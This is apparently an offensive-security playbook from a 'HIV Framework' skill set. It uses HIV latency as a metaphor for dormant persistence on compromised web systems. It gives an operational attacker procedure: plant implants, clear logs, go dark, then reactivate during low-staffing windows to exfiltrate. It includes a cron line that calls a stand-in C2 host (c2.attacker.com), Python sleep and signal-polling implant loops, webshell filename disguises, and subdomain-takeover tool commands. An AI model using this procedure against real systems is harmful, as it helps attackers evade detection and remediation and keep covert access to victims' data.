# 😴 Latency Protocol — Dormancy & Sleeping Implants

> *"Sebagian sel CD4 yang terinfeksi memasuki keadaan istirahat dengan provirus HIV yang tidak aktif atau sangat sedikit aktif. Sel tersebut tidak menghasilkan cukup protein virus untuk menjadi sasaran yang jelas bagi sistem imun."*

---

## Concept

The most dangerous HIV-infected cells are the ones doing **nothing**. They carry provirus silently. No protein production. No surface markers for immune cells to target. They survive for years in this latent state — until a trigger reactivates them.

In web2 attack: an implant that sends zero requests is indistinguishable from legitimate data. An authorized OAuth app that hasn't made API calls in weeks looks exactly like an unused-but-legitimate integration. The latency protocol means: **go dark after establishing access. Wait. Then activate on signal.**

---

## Why Defenders Miss Latent Threats

```
Detection systems are optimized for:
✓ Active traffic anomalies
✓ Known malicious signatures  
✓ Behavioral patterns (many requests, unusual hours)

Detection systems miss:
✗ Static artifacts (files, records, configs) that never generate traffic
✗ Authorized integrations with no recent activity
✗ Dormant accounts with valid credentials
✗ Scheduled jobs that haven't fired yet
✗ Webhook endpoints registered but never called
```

The latent implant produces no "viral load" — zero traffic. Standard SIEM alerting has nothing to trigger on.

---

## Latent Reservoir Types

### Type 1: Credential Reservoir

```
What: Stolen credentials stored encrypted, not yet used
Where: Offline storage (attacker's own systems)
Viral load: Zero (no login attempts)
Activation: Manual decision when timing is right
Detection: Impossible until activated
Duration: Until passwords are rotated (often never for service accounts)

Examples:
- API keys from GitHub leak, stored, used months later
- DB credentials from SQLi dump, used after initial compromise is "remediated"
- OAuth tokens with long expiry (some never expire)
```

### Type 2: Authorized Application Reservoir

```
What: OAuth app authorized by victim account
Where: Victim's account "Authorized Applications" list
Viral load: Zero (attacker hasn't called API)
Activation: Call OAuth-protected API endpoints using stored token
Detection: Difficult — authorized apps are expected to exist

Examples:
- Malicious OAuth app user authorized during phishing
- Third-party integration with excessive scopes
- "Test" OAuth app left authorized by developer
```

### Type 3: File Reservoir (Webshell in Latency)

```
What: Webshell uploaded but not accessed
Where: Target's web-accessible directory
Viral load: Zero (no requests to shell URL)
Activation: HTTP GET/POST to specific shell URL
Detection: File hash scanning (some detect), but only if looking

# Filename obfuscation strategies:
wp-config-backup.php.bak  → webshell disguised as backup
jquery-3.6.0.min.js       → PHP in a .js file (if misconfigured)
.htaccess                 → Apache directives that execute PHP
                             or serve a disguised file as PHP
uploads/2024/03/image.php → Hidden in upload directory tree
```

### Type 4: Timing Reservoir (Scheduled Activation)

```
What: Persistence mechanism set to fire at future time
Where: Cron job, Windows Task Scheduler, application-level scheduler
Viral load: Zero until trigger time
Activation: Time-based

# Cron example — fires once, at 3 AM, 90 days from now:
0 3 10 1 * curl -s http://c2.attacker.com/$(hostname)

# Application-level — seed a job queue entry with future timestamp:
{"job": "send_report", "payload": "ATTACK_CODE", "run_at": "2024-06-01T03:00:00"}
```

### Type 5: DNS Reservoir (Subdomain Takeover)

```
What: CNAME pointing to unclaimed/expired service
Where: Target's DNS records
Viral load: Zero (attacker hasn't claimed the service)
Activation: Register the unclaimed service → take control
Detection: Needs active monitoring of DNS records

# Discovery:
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
subzy run --targets subdomains.txt

# Activation: claim the cloud service, point it to attacker content
# Duration: indefinite until DNS record is removed
```

---

## Activation Triggers (What Wakes the Reservoir)

### Time-Based Trigger

```python
# Implant that sleeps until specific date
import time
from datetime import datetime

def latent_activation():
    target_date = datetime(2024, 6, 1, 3, 0, 0)
    
    while datetime.now() < target_date:
        time.sleep(3600)  # Check every hour
    
    # ACTIVATE
    execute_payload()
```

### Signal-Based Trigger

```python
# Implant that monitors for a specific signal before activating
# Signal could be: specific HTTP request, specific DNS query, dead man switch

def latent_monitor(signal_url: str):
    import requests, time
    
    while True:
        try:
            r = requests.get(signal_url, timeout=5)
            if r.text.strip() == "WAKE":
                execute_payload()
                break
            elif r.text.strip() == "SLEEP":
                time.sleep(86400)  # Sleep 24h, check again
        except:
            pass
        time.sleep(3600)
```

### Behavioral Trigger

```
# Activate when:
- Admin logs in (detect via response timing changes)
- Backup runs (detect via server load patterns)
- Specific file is accessed (monitor access logs if readable)
- Alert volume drops (defender "stood down")
- Weekend/holiday (reduced SOC staffing)
```

---

## Latency Protocol — Operational Procedure

```
[PHASE 1: ESTABLISH]
- Gain access
- Plant persistence (provirus)
- Verify persistence works
- Document exact activation method

[PHASE 2: GO DARK]
- Stop all attack traffic
- Clear logs if possible
- Wait for any incident response activity to conclude
- Monitor (passively) for signs of detection

[PHASE 3: ASSESS]
- After 7-30 days of silence:
  - Has the persistence survived?
  - Have credentials been rotated?
  - Has the OAuth app been revoked?
  - Is the webshell still accessible?

[PHASE 4: ACTIVATE]
- Only when fully confirmed that persistence is intact
- Use a different IP/proxy than initial compromise
- Activate on low-traffic window (weekend, 3-5 AM local)
- Exfiltrate/achieve objective quickly
- Return to dormancy if ongoing access is needed

[PHASE 5: RETURN TO LATENCY]
- Achieve objective
- Return implant to dormant state
- "Viral load" → zero again
- Defender detects incident, remediates visible artifacts
- Latent reservoir remains untouched
```

---

## The ART Resistance Lesson

ART (antiretroviral therapy) suppresses active HIV replication but cannot eliminate latent reservoirs. The equivalent in security:

```
Remediation actions (the "ART"):
✓ Patching the vulnerability → stops new infections
✓ Blocking the attacker's IP → stops current access
✓ Rotating passwords → invalidates active sessions
✓ Removing the webshell → eliminates one implant

What remediation misses (the "latent reservoir"):
✗ OAuth app still authorized (no activity to detect)
✗ Backup credential store attacker has offline
✗ Different persistence mechanism not found
✗ Insider threat (compromised developer account)
✗ Scheduled job that hasn't fired yet
✗ Subdomain with CNAME still pointing to attacker

The defender declares "remediation complete" while the reservoir remains.
When they stand down — the reservoir reactivates.
```

---

*Latency Protocol — Dormancy Reference*  
*Part of HIV Framework | Security--Skill by wahyunuriman999*
